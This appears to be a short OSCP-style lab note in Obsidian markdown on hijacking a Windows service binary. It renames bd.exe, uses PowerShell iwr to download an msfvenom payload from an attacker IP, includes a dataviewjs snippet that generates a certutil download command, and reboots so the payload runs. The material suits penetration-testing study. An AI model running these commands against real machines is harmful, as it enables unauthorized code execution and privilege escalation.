Goal : Replace bd.exe with msfvenom payload exe

Have to rename current bd.exe away first so I can move my own bd.exe in

```Powershell
PS C:\bd> move bd.exe bdbackup.exe
```

Use [[msfvenom]] to generate EXE

```powershell
PS C:\bd> powershell -c "iwr -uri http://192.168.45.199/bd.exe -OutFile bd.exe"
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/[file] -OutFile [file]`;

dv.paragraph("```bash\n" + command + "\n```");
```

Restart bd.exe so my new bd.exe can execute

```powershell
PS C:\bd> shutdown /r
```

```powershell
PS C:\User> shutdown /r /t 0
```
